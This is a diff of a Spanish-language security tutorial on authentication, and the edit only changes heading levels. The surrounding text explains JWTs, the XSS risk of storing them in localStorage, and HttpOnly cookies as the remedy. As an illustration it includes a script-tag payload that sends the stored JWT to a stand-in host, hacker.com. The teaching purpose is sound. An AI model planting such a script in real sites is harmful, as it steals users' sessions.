@@ -45,7 +45,7 @@ export const createUser = async (data) => {
 
 Una vez que el usuario ingresa su correo y contraseña correcta, no podemos pedirle que lo haga en cada clic. Necesitamos darle un "pase VIP". Aquí entran las Sesiones y los JWT (JSON Web Tokens).
 
-## A. JWT (JSON Web Token)
+### A. JWT (JSON Web Token)
 
 Un JWT es un string codificado en 3 partes que contiene información del usuario (Payload) y está firmado criptográficamente por el servidor (Signature).
 
@@ -56,14 +56,14 @@ Un JWT es un string codificado en 3 partes que contiene información del usuario
 - **La Prevención:** Usar cadenas criptográficas largas y aleatorias (ej. generadas con `openssl rand -base64 32`) en tu `.env`.
     
 
-## B. El Peligro del `localStorage` (Ataques XSS)
+### B. El Peligro del `localStorage` (Ataques XSS)
 
 - **El Error:** Cuando el backend genera el JWT, el frontend lo guarda en el `localStorage` del navegador para enviarlo en cada petición.
     
 - **El Ataque (XSS - Cross-Site Scripting):** Si tu foro permite comentarios, un hacker escribe un comentario con código JavaScript oculto: `<script>fetch("http://hacker.com?token=" + localStorage.getItem("jwt"))</script>`. Cuando un Administrador lee ese comentario, su navegador ejecuta el código y le envía el JWT al hacker. (Robo de sesión).
     
 
-## C. La Solución: Cookies `HttpOnly`
+### C. La Solución: Cookies `HttpOnly`
 
 Para evitar el XSS, el backend debe enviar el JWT (o el ID de sesión) dentro de una Cookie con las banderas `HttpOnly` y `Secure`.
 
